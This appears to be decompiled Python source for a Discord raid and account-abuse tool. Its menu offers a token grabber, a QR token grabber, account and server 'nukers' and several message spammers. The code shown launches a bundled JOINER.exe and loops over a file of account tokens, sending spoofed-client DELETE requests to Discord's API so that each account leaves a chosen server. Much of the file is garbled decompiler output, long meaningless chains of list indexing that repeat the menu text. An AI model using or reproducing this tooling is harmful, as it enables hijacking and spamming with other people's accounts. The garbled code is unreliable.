'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' EXIT'][f'''{Fore.RESET}''']))
    Write.Print('════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════', Colors.purple_to_blue, 0, **('interval',))
    choice = input(f'''{m}[{w}>{m}]{w} Choice?: ''')
    if choice == '1':
        Spinner()
        os.startfile(os.getcwd() + './JOINER.exe')
    if choice == '2':
        Spinner()
        token = open('tokens.txt', 'r').read().splitlines()
        ID = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Server ID: ')
        apilink = 'https://discord.com/api/v9/users/@me/guilds/' + str(ID)
        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    'content-length': '0',
                    'cookie': f'''__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US''',
                    'origin': 'https://discord.com',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36',
                    'x-context-properties': 'eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==',
                    'x-debug-options': 'bugReporterEnabled',
                    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=' }
                requests.delete(apilink, headers, **('headers',))
            print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done''')
            []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'](None, None, None)
        if not []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']:
            pass
        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  